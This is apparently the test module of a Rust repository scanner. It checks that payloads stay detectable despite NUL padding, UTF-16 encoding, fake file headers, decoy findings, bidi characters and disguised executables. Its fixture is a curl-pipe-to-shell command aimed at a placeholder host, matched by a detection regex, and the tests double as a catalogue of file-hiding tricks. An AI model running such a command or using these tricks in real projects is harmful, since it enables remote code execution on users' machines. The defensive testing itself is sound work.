        let rules = builtin_rules().unwrap();

        let report = scan(dir.path(), &rules, Limits::default());

        assert_eq!(
            builtin_findings(&report, NUL_RULE),
            [("tool.sh".to_string(), 2)]
        );
        assert!(report.skipped.is_empty());
    }

    const CURL_SH: &str = r#"
        [[rule]]
        id = "test.curl-sh"
        engine = "line-regex"
        family = "test"
        stage = "run"
        severity = "high"
        description = "Pipes a download into a shell"
        example = "lib/env:1"
        pattern = 'curl .*\| *sh'
    "#;

    const PAYLOAD: &[u8] = b"curl https://example.invalid/x | sh\n";

    fn payload_with(prefix: &[u8], suffix: &[u8]) -> Vec<u8> {
        [prefix, PAYLOAD, suffix].concat()
    }

    /// Scans one extensionless file (a shell can `source` it) with the
    /// builtin rules and the curl rule, and returns the report.
    fn scan_sourced(contents: &[u8]) -> Report {
        let dir = tempfile::tempdir().unwrap();
        write(dir.path(), "lib/env", contents);
        let mut rules = builtin_rules().unwrap();
        rules.extend(parse_rules(CURL_SH, "test.toml").unwrap());
        scan(dir.path(), &rules, Limits::default())
    }

    fn assert_payload_found_on_line(report: &Report, line: usize) {
        let found: Vec<_> = report
            .findings
            .iter()
            .filter(|f| f.rule_id == "test.curl-sh")
            .collect();
        assert_eq!(found.len(), 1, "{:?}", report.findings);
        assert_eq!(found[0].line, line);
        assert!(
            report
                .skipped
                .iter()
                .all(|s| s.reason == SkipReason::Binary)
        );
        assert!(report.is_complete());
    }

    #[test]
    fn one_nul_and_one_invalid_byte_do_not_hide_a_sourced_payload() {
        let report = scan_sourced(&payload_with(b"", b"# \0\xFF\n"));

        assert_payload_found_on_line(&report, 1);
        assert!(
            report.findings[0]
                .explanation
                .ends_with("(found in a binary-looking file)"),
            "{}",
            report.findings[0].explanation
        );
    }

    #[test]
    fn a_nul_past_the_sniffed_prefix_does_not_hide_a_payload() {
        let comments = "# a comment line\n".repeat(600);
        assert!(comments.len() > BINARY_SNIFF_LEN);
        let report = scan_sourced(&payload_with(comments.as_bytes(), b"# \0\xFF\n"));

        assert_payload_found_on_line(&report, 601);
    }

    #[test]
    fn nul_padding_after_a_payload_does_not_hide_it() {
        let report = scan_sourced(&payload_with(b"", &[0; 4096]));

        assert_payload_found_on_line(&report, 1);
    }

    #[test]
    fn nul_between_every_byte_does_not_hide_a_payload() {
        // ASCII in UTF-16 without a byte order mark: one NUL per byte.
        let wide: Vec<u8> = PAYLOAD.iter().flat_map(|&b| [b, 0]).collect();
        let report = scan_sourced(&wide);

        assert_payload_found_on_line(&report, 1);
    }

    #[test]
    fn a_latin_1_byte_with_a_nul_does_not_hide_a_payload() {
        let report = scan_sourced(&payload_with(b"", b"# caf\xE9 \0\n"));

        assert_payload_found_on_line(&report, 1);
    }

    #[test]
    fn text_with_a_stray_nul_is_not_marked_binary_looking() {
        let report = scan_sourced(&payload_with(b"# a stray \0 in plain text\n", b""));

        assert_payload_found_on_line(&report, 2);
        assert!(!report.findings[0].explanation.contains("binary-looking"));
        assert!(report.skipped.is_empty());
    }

    #[test]
    fn a_known_header_does_not_hide_a_sourced_payload() {
        // `GIF89a=1` is a valid shell assignment; the rest of the file runs.
        for header in [&b"GIF89a=1\n"[..], b"%PDF-1.4\n", b"PK\x03\x04\n"] {
            let report = scan_sourced(&payload_with(header, b"\0\n"));

            assert_payload_found_on_line(&report, 2);
            assert!(
                report.findings[0]
                    .explanation
                    .ends_with("(found in a binary-looking file)")
            );
            assert!(report.is_complete());
        }
    }

    #[test]
    fn real_binary_formats_give_no_findings() {
        let dir = tempfile::tempdir().unwrap();
        let formats: [(&str, &[u8]); 5] = [
            ("a.png", b"\x89PNG\r\n\x1a\n\0\0\0\rIHDR"),
            ("b.zip", b"PK\x03\x04\x14\0\0\0\x08\0"),
            ("c.gz", &[0x1F, 0x8B, 8, 0, 0, 0, 0, 0]),
            ("d.icns", b"icns\0\0\x10\0"),
            ("e.mp3", b"ID3\x03\0\0\0\0\x0a\0"),
        ];
        for (name, header) in formats {
            write(dir.path(), name, &noise_with_bidi(header));
        }
        let mut rules = builtin_rules().unwrap();
        rules.extend(parse_rules(CURL_SH, "test.toml").unwrap());

        let report = scan(dir.path(), &rules, Limits::default());

        assert!(report.findings.is_empty(), "{:?}", report.findings);
        assert_eq!(report.skipped.len(), 5);
        assert!(report.is_complete());
    }

    #[test]
    fn a_flood_of_low_findings_cannot_hide_a_critical_one() {
        const DECOY_AND_PAYLOAD: &str = r#"
            [[rule]]
            id = "test.decoy"
            engine = "line-regex"
            family = "test"
            stage = "run"
            severity = "low"
            description = "Decoy"
            example = "a:1"
            pattern = 'DECOY'

            [[rule]]
            id = "test.payload"
            engine = "line-regex"
            family = "test"
            stage = "run"
            severity = "critical"
            description = "Payload"
            example = "a:1"
            pattern = 'PAYLOAD'
        "#;
        let dir = tempfile::tempdir().unwrap();
        let mut contents = "DECOY\n".repeat(150);
        contents.push_str("PAYLOAD\n");
        write(dir.path(), "x.txt", contents.as_bytes());
        let rules = parse_rules(DECOY_AND_PAYLOAD, "test.toml").unwrap();

        let report = scan(dir.path(), &rules, Limits::default());

        let critical: Vec<_> = report
            .findings
            .iter()
            .filter(|f| f.severity == Severity::Critical)
            .map(|f| f.line)
            .collect();
        assert_eq!(critical, [151]);
        assert_eq!(
            report.unlisted,
            [Unlisted {
                file: PathBuf::from("x.txt"),
                rule_id: "test.decoy".to_string(),
                severity: Severity::Low,
                count: 50,
            }]
        );
    }

    #[test]
    fn a_character_cut_by_a_nul_is_whole_for_the_line_rules() {
        let dir = tempfile::tempdir().unwrap();
        write(
            dir.path(),
            "notes",
            b"some notes x \xE2\0\x80\xAE y and more text\n",
        );
        let rules = builtin_rules().unwrap();

        let report = scan(dir.path(), &rules, Limits::default());

        assert_eq!(
            builtin_findings(&report, "deception.bidi-control"),
            [("notes".to_string(), 1)]
        );
    }

    #[test]
    fn a_line_rule_lists_a_limited_number_of_findings_per_file_and_counts_the_rest() {
        let dir = tempfile::tempdir().unwrap();
        write(dir.path(), "todo.txt", "TODO\n".repeat(130).as_bytes());
        write(dir.path(), "few.txt", "TODO\n".repeat(3).as_bytes());
        let rules = parse_rules(RULES, "test.toml").unwrap();

        let report = scan(dir.path(), &rules, Limits::default());

        let in_file = |name: &str| {
            report
                .findings
                .iter()
                .filter(|f| to_slash(&f.file) == name)
                .count()
        };
        assert_eq!(in_file("todo.txt"), MAX_LINE_FINDINGS_PER_RULE);
        assert_eq!(in_file("few.txt"), 3);
        assert_eq!(
            report.unlisted,
            [Unlisted {
                file: PathBuf::from("todo.txt"),
                rule_id: "test.everywhere".to_string(),
                severity: Severity::Low,
                count: 30,
            }]
        );
    }

    #[test]
    fn nul_ratio_and_utf8_checks() {
        assert!(nul_file_is_text(b"a stray \0 in some text"));
        assert!(nul_file_is_text("h\0\u{e9}llo \u{202e} world\n".as_bytes()));
        // A multi-byte character split by a NUL is whole again once it is gone.
        assert!(nul_file_is_text(
            b"some text \xE2\0\x80\xAE here and there\0"
        ));
        assert!(!nul_file_is_text(b"some text \0 and \xFF"));
        assert!(!nul_file_is_text(b"some text \0 and \xE2\x80"), "cut-off");
        assert!(!nul_file_is_text(&[0; 64]));
        // The limit is one NUL in eight bytes.
        assert!(nul_file_is_text(b"abcdefg\0"));
        assert!(!nul_file_is_text(b"abcdef\0\0"));

        // Feeding in pieces gives the same answer as feeding all at once.
        let data = "h\u{e9}\0llo \u{202e}\0 and more text \n".as_bytes();
        for first in 0..data.len() {
            for second in first..data.len() {
                let mut probe = NulProbe::default();
                probe.feed(&data[..first]);
                probe.feed(&data[first..second]);
                probe.feed(&data[second..]);
                assert!(probe.is_text(), "cuts at {first} and {second}");
            }
        }
    }

    // ---- files read as a stream ---------------------------------------------

    /// Every file of more than one byte is read as a stream.
    fn streaming() -> Limits {
        Limits {
            max_buffered_size: 1,
            ..Limits::default()
        }
    }

    #[test]
    fn a_streamed_file_gets_the_same_result_as_one_read_whole() {
        let dir = tempfile::tempdir().unwrap();
        let comments = "# a comment line\n".repeat(600);
        let files: [(&str, Vec<u8>); 9] = [
            (
                "plain.txt",
                b"one\r\ntwo\nTODO\r\nTODO\n\nlast TODO".to_vec(),
            ),
            ("lib/env", payload_with(b"", b"# \0\xFF\n")),
            ("late-nul", payload_with(comments.as_bytes(), b"# \0\xFF\n")),
            ("padded", payload_with(b"", &[0; 4096])),
            ("gif", payload_with(b"GIF89a=1\n", b"\0\n")),
            ("icon.icns", noise_with_bidi(b"icns\0\0\x10\0")),
            (
                "run.sh",
                format!("#!/bin/sh\n# a\0b\necho {BIDI}\n").into_bytes(),
            ),
            (
                "notes",
                b"some notes x \xE2\0\x80\xAE y and more text\n".to_vec(),
            ),
            ("todos.txt", "TODO\n".repeat(130).into_bytes()),
        ];
        for (name, contents) in &files {
            write(dir.path(), name, contents);
        }
        let mut rules = builtin_rules().unwrap();
        rules.extend(parse_rules(CURL_SH, "test.toml").unwrap());
        rules.extend(parse_rules(RULES, "test.toml").unwrap());

        let whole = scan(dir.path(), &rules, Limits::default());
        let streamed = scan(dir.path(), &rules, streaming());

        assert!(!whole.findings.is_empty());
        assert_eq!(whole.findings, streamed.findings);
        assert_eq!(whole.unlisted, streamed.unlisted);
        assert_eq!(whole.skipped, streamed.skipped);
        assert_eq!(whole.files_scanned, streamed.files_scanned);
    }

    #[test]
    fn a_large_text_file_is_scanned_and_the_scan_stays_complete() {
        let dir = tempfile::tempdir().unwrap();
        let mut contents = "x = 1\n".repeat(2000).into_bytes();
        contents.extend_from_slice(PAYLOAD);
        write(dir.path(), "fixture.ts", &contents);
        let mut rules = Vec::new();
        rules.extend(parse_rules(CURL_SH, "test.toml").unwrap());
        let limits = Limits {
            max_buffered_size: 1024,
            ..Limits::default()
        };

        let report = scan(dir.path(), &rules, limits);

        assert_eq!(report.findings.len(), 1);
        assert_eq!(report.findings[0].line, 2001);
        assert!(report.skipped.is_empty());
        assert!(report.is_complete());
        assert_eq!(report.files_scanned, 1);
    }

    #[test]
    fn a_streamed_executable_is_listed_and_a_streamed_binary_is_ascii_only() {
        let dir = tempfile::tempdir().unwrap();
        write(dir.path(), "tool.exe", &noise_with_bidi(b"MZ\x90\0"));
        write(dir.path(), "voice.mp3", &noise_with_bidi(b"ID3\x03\0\0\0"));
        let rules = builtin_rules().unwrap();

        let report = scan(dir.path(), &rules, streaming());

        // The streamed executable gets its head rules: a finding, and listed.
        let found: Vec<_> = report
            .findings
            .iter()
            .map(|f| (to_slash(&f.file), f.rule_id.as_str()))
            .collect();
        assert_eq!(found, [("tool.exe".to_string(), "repo.committed-binary")]);
        let mut reasons: Vec<_> = report
            .skipped
            .iter()
            .map(|s| (to_slash(&s.path), s.reason.clone()))
            .collect();
        reasons.sort_by(|a, b| a.0.cmp(&b.0));
        assert_eq!(
            reasons,
            [
                (
                    "tool.exe".to_string(),
                    SkipReason::Executable {
                        format: "PE",
                        reported: true,
                    }
                ),
                ("voice.mp3".to_string(), SkipReason::Binary),
            ]
        );
        assert!(report.is_complete());
    }

    #[test]
    fn a_streamed_file_that_a_whole_file_rule_selects_is_still_listed_as_too_large() {
        let dir = tempfile::tempdir().unwrap();
        write(dir.path(), "big.pth", &[b'#'; 100]);
        let rules = [file_rule("**/*.pth", probe)];

        let report = scan(dir.path(), &rules, streaming());

        let found = explanations(&report);
        assert_eq!(found.len(), 1, "the rule runs once");
        assert!(found[0].1.contains("issue=Some(TooLarge { size: 100 })"));
        assert!(matches!(
            report.skipped[..],
            [Skipped {
                reason: SkipReason::TooLarge { size: 100 },
                ..
            }]
        ));
        assert!(!report.is_complete());
    }

    #[test]
    fn a_streamed_executable_still_lets_a_rule_that_selects_it_by_name_run() {
        let dir = tempfile::tempdir().unwrap();
        let mut bytes = b"MZ\x90\0\nimport os\n".to_vec();
        bytes.extend_from_slice(&[b'#'; 100]);
        write(dir.path(), "x.pth", &bytes);
        let rules = [file_rule("**/*.pth", probe)];

        let report = scan(dir.path(), &rules, streaming());

        let found = explanations(&report);
        assert_eq!(found.len(), 1, "the rule runs once");
        assert!(found[0].1.contains("issue=Some(TooLarge"), "{}", found[0].1);
        let kinds: Vec<_> = report.skipped.iter().map(|s| s.reason.clone()).collect();
        assert!(kinds.contains(&SkipReason::Executable {
            format: "PE",
            reported: false,
        }));
        assert!(!report.is_complete());
    }

    #[test]
    fn chunk_edges_do_not_change_what_a_streamed_file_means() {
        // Things that straddle the 64 KiB read size of the first pass.
        let edge = 64 * 1024;
        let mut files: Vec<(String, Vec<u8>)> = Vec::new();
        for shift in [2usize, 1, 0] {
            // A NUL, then a cut bidi character, then a payload line.
            let mut bytes = vec![b'a'; edge - shift];
            bytes.extend_from_slice(b"\n");
            bytes.extend_from_slice(b"x \xE2\0\x80\xAE y\n");
            bytes.extend_from_slice(PAYLOAD);
            bytes.extend_from_slice(b"# \0\n");
            files.push((format!("edge-{shift}"), bytes));
            let mut script = b"#!/bin/sh\n".to_vec();
            script.extend(vec![b'#'; edge - shift - script.len()]);
            script.extend_from_slice(b"\0\r\n");
            script.extend_from_slice(PAYLOAD);
            files.push((format!("edge-{shift}.sh"), script));
        }
        let dir = tempfile::tempdir().unwrap();
        for (name, bytes) in &files {
            write(dir.path(), name, bytes);
        }
        let mut rules = builtin_rules().unwrap();
        rules.extend(parse_rules(CURL_SH, "test.toml").unwrap());

        let whole = scan(dir.path(), &rules, Limits::default());
        let streamed = scan(dir.path(), &rules, streaming());

        assert!(whole.findings.len() >= 12, "{:?}", whole.findings);
        assert_eq!(whole.findings, streamed.findings);
        assert_eq!(whole.skipped, streamed.skipped);
    }

    #[test]
    fn a_file_of_exactly_the_buffer_size_is_read_whole_and_one_byte_more_is_streamed() {
        let dir = tempfile::tempdir().unwrap();
        let limits = Limits {
            max_buffered_size: 100,
            ..Limits::default()
        };
        let rules = [file_rule("**/*.pth", probe)];
        write(dir.path(), "whole.pth", &[b'#'; 100]);
        write(dir.path(), "streamed.pth", &[b'#'; 101]);

        let report = scan(dir.path(), &rules, limits);

        let found = explanations(&report);
        let of = |name: &str| {
            found
                .iter()
                .find(|(file, _)| file == name)
                .unwrap()
                .1
                .clone()
        };
        assert!(of("whole.pth").contains("bytes=100 issue=None"));
        assert!(of("streamed.pth").contains("TooLarge"));
    }

    #[test]
    fn a_crlf_line_of_exactly_the_limit_is_not_too_long() {
        let dir = tempfile::tempdir().unwrap();
        let mut contents = vec![b'x'; 50];
        contents.extend_from_slice(b"\r\nTODO\n");
        write(dir.path(), "a.txt", &contents);
        let rules = parse_rules(RULES, "test.toml").unwrap();
        let limits = Limits {
            max_buffered_size: 10,
            max_line_size: 50,
            ..Limits::default()
        };

        let report = scan(dir.path(), &rules, limits);

        assert_eq!(report.findings.len(), 1);
        assert!(report.skipped.is_empty());
    }

    #[test]
    fn a_line_longer_than_the_limit_makes_the_scan_inconclusive() {
        let dir = tempfile::tempdir().unwrap();
        let mut contents = b"short\nTODO\n".to_vec();
        contents.extend_from_slice(&[b'x'; 200]);
        contents.extend_from_slice(b"\nTODO\n");
        write(dir.path(), "min.js", &contents);
        let rules = parse_rules(RULES, "test.toml").unwrap();
        let limits = Limits {
            max_buffered_size: 10,
            max_line_size: 100,
            ..Limits::default()
        };

        let report = scan(dir.path(), &rules, limits);

        assert_eq!(report.findings.len(), 1, "the line before it was scanned");
        assert!(matches!(
            report.skipped[..],
            [Skipped {
                reason: SkipReason::LineTooLong { line: 3 },
                ..
            }]
        ));
        assert!(!report.is_complete());
    }

    #[test]
    fn a_streamed_utf16_script_cannot_be_decoded_and_is_listed_as_too_large() {
        let dir = tempfile::tempdir().unwrap();
        let mut bytes = vec![0xFF, 0xFE];
        bytes.extend("# evil\n".encode_utf16().flat_map(u16::to_le_bytes));
        write(dir.path(), "big.ps1", &bytes);
        let rules = builtin_rules().unwrap();

        let report = scan(dir.path(), &rules, streaming());

        assert!(matches!(
            report.skipped[..],
            [Skipped {
                reason: SkipReason::TooLarge { .. },
                ..
            }]
        ));
    }

    #[test]
    fn an_elf_named_like_a_script_is_an_executable_not_a_script() {
        let dir = tempfile::tempdir().unwrap();
        write(dir.path(), "tool.sh", b"\x7fELF\x02\x01\x01\0\0\0\0\0");
        let rules = builtin_rules().unwrap();

        let report = scan(dir.path(), &rules, Limits::default());

        // Reported as an executable disguised as a script, not as a script.
        assert_eq!(report.inconclusive_count(), 0);
        assert!(builtin_findings(&report, NUL_RULE).is_empty());
        assert_eq!(
            builtin_findings(&report, "repo.disguised-executable").len(),
            1
        );
        assert_eq!(
            report.skipped[0].reason,
            SkipReason::Executable {
                format: "ELF",
                reported: true
            }
        );
    }

    #[test]
    fn script_detection_and_nul_line_helpers() {
        assert!(is_script("a/b/run.sh", b""));
        assert!(is_script("a/RUN.PS1", b""));
        assert!(is_script("tool", b"#!/usr/bin/env node\n"));
        assert!(!is_script("a.txt", b"hello"));
        assert!(!is_script("archive.sh.zip", b"PK"));
        assert!(!is_script("x.ps1", &[0xFF, 0xFE, b'a', 0]));
        assert!(has_script_extension("x.ps1"));
        assert_eq!(decode_utf16_bom(&[0xFF, 0xFE, b'a', 0, b'b', 0]), "ab");
        assert_eq!(decode_utf16_bom(&[0xFE, 0xFF, 0, b'a', 0xD8]), "a\u{FFFD}");
        assert!(!is_script("noext", b"plain"));

        assert_eq!(first_nul_line(b"a\nb\0c"), Some(2));
        assert_eq!(first_nul_line(b"a\r\nb\r\n\0"), Some(3));
        assert_eq!(first_nul_line(b"no nul"), None);
    }

    /// `(line, column, span, snippet)` of a finding.
    type Located = (usize, Option<usize>, Option<Range<usize>>, Option<String>);

    fn locations(report: &Report, rule_id: &str) -> Vec<Located> {
        report
            .findings
            .iter()
            .filter(|f| f.rule_id == rule_id)
            .map(|f| (f.line, f.column, f.span.clone(), f.snippet.clone()))
            .collect()
    }

    fn scan_one_with(name: &str, contents: &[u8], limits: Limits) -> Report {
        let dir = tempfile::tempdir().unwrap();
        write(dir.path(), name, contents);
        let mut rules = builtin_rules().unwrap();
        rules.extend(parse_rules(RULES, "test.toml").unwrap());
        scan(dir.path(), &rules, limits)
    }

    fn scan_one(name: &str, contents: &[u8]) -> Report {
        scan_one_with(name, contents, Limits::default())
    }

    fn some(text: &str) -> Option<String> {
        Some(text.to_string())
    }

    #[test]
    fn line_findings_have_column_span_and_snippet_with_lf_and_crlf() {
        for (contents, line_start) in [
            (&b"ab\nx  TODO y\n"[..], 3),
            (&b"ab\r\nx  TODO y\r\n"[..], 4),
        ] {
            let report = scan_one("a.txt", contents);
            let span = line_start + 3..line_start + 7;
            assert_eq!(
                locations(&report, "test.everywhere"),
                [(2, Some(4), Some(span.clone()), some("x  TODO y"))]
            );
            assert_eq!(&contents[span], b"TODO");
        }
    }

    #[test]
    fn columns_count_characters_and_skip_a_byte_order_mark() {
        let contents = "\u{feff}TODO\r\n\u{e9}\u{1F600} TODO\r\nlast TODO".as_bytes();
        let report = scan_one("a.txt", contents);
        let found = locations(&report, "test.everywhere");
        assert_eq!(
            found,
            [
                (1, Some(1), Some(3..7), some("TODO")),
                (2, Some(4), Some(16..20), some("\u{e9}\u{1F600} TODO")),
                (3, Some(6), Some(27..31), some("last TODO")),
            ]
        );
        for (_, _, span, _) in found {
            assert_eq!(&contents[span.unwrap()], b"TODO");
        }
    }

    #[test]
    fn no_span_or_column_when_the_text_is_not_the_file_byte_for_byte() {
        // A NUL in a script: the line rules read it with the NUL dropped, so
        // their offsets are not the file's; the NUL's own offset is exact.
        let report = scan_one("run.sh", b"a\n#\0x\nTODO\n");
        assert_eq!(
            locations(&report, "test.everywhere"),
            [(3, None, None, some("TODO"))]
        );
        assert_eq!(
            locations(&report, "deception.nul-byte-in-script"),
            [(2, None, Some(3..4), None)]
        );

        // Invalid UTF-8 is replaced, which changes the byte length.
        let report = scan_one("a.txt", b"\xFF TODO");
        assert_eq!(
            locations(&report, "test.everywhere"),
            [(1, None, None, some("\u{FFFD} TODO"))]
        );

        // Binary-looking data is read as ASCII only.
        let report = scan_one("blob.bin", b"\x1f\x8b\0\0 TODO");
        let found = locations(&report, "test.everywhere");
        assert_eq!((found[0].1, found[0].2.clone()), (None, None));

        // UTF-16 is decoded: the column is in the decoded line, there is no span.
        let mut utf16 = vec![0xFF, 0xFE];
        for unit in "x \u{202E} TODO".encode_utf16() {
            utf16.extend(unit.to_le_bytes());
        }
        let report = scan_one("run.ps1", &utf16);
        assert_eq!(
            locations(&report, "deception.bidi-control"),
            [(1, Some(3), None, some("x \\u{202E} TODO"))]
        );
        assert_eq!(locations(&report, "test.everywhere")[0].1, Some(5));
    }

    #[test]
    fn a_streamed_file_has_exact_spans_only_when_it_is_its_own_text() {
        let streamed = Limits {
            max_buffered_size: 1,
            ..Limits::default()
        };
        let contents = b"one\r\ntwo\r\nx TODO\r\n";
        let report = scan_one_with("a.txt", contents, streamed);
        assert_eq!(
            locations(&report, "test.everywhere"),
            [(3, Some(3), Some(12..16), some("x TODO"))]
        );
        assert_eq!(&contents[12..16], b"TODO");

        // One invalid byte anywhere and no line has a span, as when read whole.
        let report = scan_one_with("b.txt", b"\xFF\r\nx TODO\r\n", streamed);
        assert_eq!(
            locations(&report, "test.everywhere"),
            [(2, None, None, some("x TODO"))]
        );
    }

    #[test]
    fn snippets_keep_the_match_in_view_on_long_lines() {
        let line = format!("{}TODO{}", "a".repeat(500), "b".repeat(500));
        let report = scan_one("a.txt", line.as_bytes());
        let found = locations(&report, "test.everywhere");
        assert_eq!(found[0].1, Some(501));
        let expected = format!("...{}TODO{}...", "a".repeat(40), "b".repeat(76));
        assert_eq!(found[0].3.as_deref(), Some(expected.as_str()));
    }

    #[test]
    fn hostile_snippets_are_escaped_capped_and_still_show_the_match() {
        let mut line = String::from("\t\u{1b}[2J\u{9b}\u{2028}\u{E0041}");
        line.push_str(&"\u{202E}".repeat(10_000));
        line.push_str("TODO\tx \r\n");
        let report = scan_one("a.txt", line.as_bytes());

        let todo = locations(&report, "test.everywhere")[0].3.clone().unwrap();
        assert_eq!(todo, format!("...{}TODO x", "\\u{202E}".repeat(5)));

        let bidi = locations(&report, "deception.bidi-control")[0]
            .3
            .clone()
            .unwrap();
        let start = "\\u{001B}[2J\\u{009B}\\u{2028}\\u{E0041}";
        assert!(bidi.starts_with(start), "{bidi}");
        assert!(bidi.ends_with("..."), "{bidi}");
        assert!(bidi.chars().count() <= MAX_SNIPPET_CHARS + 16, "{bidi}");
        for snippet in [&todo, &bidi] {
            assert!(
                snippet
                    .chars()
                    .all(|c| c.is_ascii() && !c.is_ascii_control()),
                "{snippet:?}"
            );
        }
    }

    #[test]
    fn jsonc_findings_point_at_the_value_even_after_a_byte_order_mark() {
        let text = "{\r\n  // c\r\n  \"tasks\": [{\"label\": \"x\",\r\n    \"runOptions\": {\"runOn\": \"folderOpen\"}}]\r\n}\r\n";
        let mut spans = Vec::new();
        for prefix in ["", "\u{feff}"] {
            let contents = format!("{prefix}{text}");
            let report = scan_one(".vscode/tasks.json", contents.as_bytes());
            let found = locations(&report, "ide.vscode-folder-open-task");
            assert_eq!(found.len(), 1);
            let (line, column, span, snippet) = found[0].clone();
            assert_eq!((line, column), (4, Some(29)));
            assert_eq!(
                snippet.as_deref(),
                Some(r#""runOptions": {"runOn": "folderOpen"}}]"#)
            );
            let span = span.unwrap();
            assert_eq!(&contents.as_bytes()[span.clone()], b"\"folderOpen\"");
            spans.push(span.start);
        }
        assert_eq!(
            spans[1],
            spans[0] + 3,
            "the byte order mark is part of the file"
        );
    }

    #[test]
    fn a_binary_looking_tasks_file_keeps_its_note_and_gets_no_span() {
        let contents =
            b"{/* \0\0\0\0\0\0\0\0\0\0\xFF */ \"tasks\": [{\"runOptions\": {\"runOn\": \"folderOpen\"}}]}";
        let report = scan_one(".vscode/tasks.json", contents);
        let finding = report
            .findings
            .iter()
            .find(|f| f.rule_id == "ide.vscode-folder-open-task")
            .unwrap();
        assert_eq!((finding.column, &finding.span), (None, &None));
        assert!(finding.snippet.is_some());
        assert!(finding.explanation.ends_with(BINARY_LOOKING_NOTE));
    }

    #[test]
    fn spans_from_a_check_are_validated_and_located_hits_are_capped() {
        fn many(ctx: &Ctx<'_>) -> Vec<Hit> {
            let hit = |line, span| Hit {
                line,
                span: Some(TextSpan(span)),
                severity: ctx.base,
                reason: "bad".to_string(),
            };
            // Reversed, past the end, inside a character, at the very end of
            // the address space, and on another line than the one named.
            let mut hits = vec![
                hit(1, Range { start: 3, end: 1 }),
                hit(1, 0..100_000),
                hit(1, 300..301),
                hit(1, usize::MAX..usize::MAX),
                hit(2, 0..1),
            ];
            for index in 0..150 {
                let mut good = hit(1, index..index + 1);
                good.reason = "good".to_string();
                hits.push(good);
            }
            hits
        }
        let dir = tempfile::tempdir().unwrap();
        let mut text = "x".repeat(300);
        text.push('\u{e9}');
        write(dir.path(), "a.json", text.as_bytes());
        let mut rule = file_rule("**/*.json", many);
        rule.matcher = Matcher::Jsonc(many);

        let report = scan(dir.path(), &[rule], Limits::default());

        assert_eq!(report.findings.len(), 155, "locating never drops a finding");
        for finding in report.findings.iter().filter(|f| f.explanation == "bad") {
            assert_eq!((finding.column, &finding.span), (None, &None));
            assert_eq!(finding.snippet, None);
        }
        let located = report
            .findings
            .iter()
            .filter(|f| f.column.is_some())
            .count();
        assert_eq!(located, MAX_LOCATED_HITS - 5);
    }

    #[cfg(unix)]
    #[test]
    fn an_entry_whose_bytes_are_not_its_own_gets_no_location() {
        fn spanned(ctx: &Ctx<'_>) -> Vec<Hit> {
            vec![Hit {
                line: 1,
                span: Some(TextSpan(0..6)),
                severity: ctx.base,
                reason: format!("bytes={}", ctx.bytes().len()),
            }]
        }
        let dir = tempfile::tempdir().unwrap();
        write(dir.path(), "real.txt", b"import os\n");
        std::os::unix::fs::symlink("real.txt", dir.path().join("evil.pth")).unwrap();
        let rules = [file_rule("**/*.pth", spanned)];

        let report = scan(dir.path(), &rules, Limits::default());

        let finding = &report.findings[0];
        assert_eq!(finding.explanation, "bytes=10", "the check saw the target");
        assert_eq!(
            (finding.column, &finding.span, &finding.snippet),
            (None, &None, &None)
        );
    }

    #[test]
    fn location_helpers_never_panic_on_odd_input() {
        assert_eq!(Location::in_text("", &(0..0), true, true).column, Some(1));
        assert_eq!(Location::in_text("ab", &(2..2), true, true).column, Some(3));
        assert_eq!(
            Location::in_text("a\r\n", &(1..2), true, true).column,
            Some(2)
        );
        let past = Location::in_line("ab", 9, false, true, Some(0..1));
        assert_eq!((past.column, past.span), (Some(3), Some(0..1)));
        assert_eq!(snippet("", 0), "");
        assert_eq!(snippet("   ", 1), "");
        assert_eq!(
            snippet("\u{e9}", 1),
            "",
            "inside a character: nothing, no panic"
        );
        assert_eq!(snippet("\u{e9}x", 2), "\u{e9}x");
        assert_eq!(nul_span(b"ab"), None);
        assert_eq!(nul_span(b"a\0"), Some(1..2));
    }

    fn head_rule(check: Check) -> Rule {
        let mut rule = file_rule("**", check);
        rule.id = "test.head".to_string();
        rule.matcher = Matcher::Head(check);
        rule.files = None;
        rule
    }

    #[test]
    fn head_rules_see_every_entry_once_and_never_make_a_file_too_large() {
        fn seen(ctx: &Ctx<'_>) -> Vec<Hit> {
            vec![Hit {
                line: 1,
                span: None,
                severity: ctx.base,
                reason: format!("bytes={} issue={:?}", ctx.bytes().len(), ctx.issue),
            }]
        }
        let dir = tempfile::tempdir().unwrap();
        write(dir.path(), "small.txt", b"0123456789");
        write(dir.path(), "big.txt", &[b'x'; 2000]);
        write(dir.path(), "big.pth", &[b'#'; 2000]);
        write(dir.path(), "huge.txt", &[b'y'; 5000]);
        #[cfg(unix)]
        std::os::unix::fs::symlink("small.txt", dir.path().join("link")).unwrap();
        let rules = [head_rule(seen), file_rule("**/*.pth", probe)];
        let limits = Limits {
            max_buffered_size: 1024,
            max_file_size: 4096,
            ..Limits::default()
        };

        let report = scan(dir.path(), &rules, limits);

        let head: Vec<_> = report
            .findings
            .iter()
            .filter(|f| f.rule_id == "test.head")
            .map(|f| (to_slash(&f.file), f.explanation.clone()))
            .collect();
        let mut expected = vec![
            ("big.pth".to_string(), "bytes=2000 issue=None".to_string()),
            ("big.txt".to_string(), "bytes=2000 issue=None".to_string()),
            (
                "huge.txt".to_string(),
                "bytes=5000 issue=Some(TooLarge { size: 5000 })".to_string(),
            ),
            ("small.txt".to_string(), "bytes=10 issue=None".to_string()),
        ];
        if cfg!(unix) {
            expected.insert(
                3,
                (
                    "link".to_string(),
                    "bytes=10 issue=Some(Symlink { target: Some(\"small.txt\"), resolved: \
                     Some(\"small.txt\") })"
                        .to_string(),
                ),
            );
        }
        assert_eq!(head, expected);
        // Only the files over the limit, and the streamed file that a file
        // rule selects, are listed as too large; the head rule adds nothing.
        let too_large: Vec<_> = report
            .skipped
            .iter()
            .filter(|s| matches!(s.reason, SkipReason::TooLarge { .. }))
            .map(|s| to_slash(&s.path))
            .collect();
        assert_eq!(too_large, ["huge.txt", "big.pth"]);
    }

    #[test]
    fn link_targets_are_resolved_as_text_the_way_either_system_reads_them() {
        let inside = |link, target| resolve_link_text(link, target);
        assert_eq!(inside("a/link", "b.txt").as_deref(), Some("a/b.txt"));
        assert_eq!(inside("a/link", "../b.txt").as_deref(), Some("b.txt"));
        assert_eq!(inside("a/link", "./c/../b").as_deref(), Some("a/b"));
        assert_eq!(inside("a/link", "..\\b.txt").as_deref(), Some("b.txt"));
        assert_eq!(inside("link", ".").as_deref(), Some(""));
        for outside in [
            "../../x",
            "/etc/passwd",
            "\\Windows",
            "C:\\Windows",
            "c:relative",
            "\\\\host.invalid\\share",
            "\\\\?\\C:\\x",
            "\\??\\C:\\x",
            "..\\..\\x",
        ] {
            assert_eq!(inside("a/link", outside), None, "{outside}");
        }
        assert_eq!(inside("link", ".."), None);
    }
}
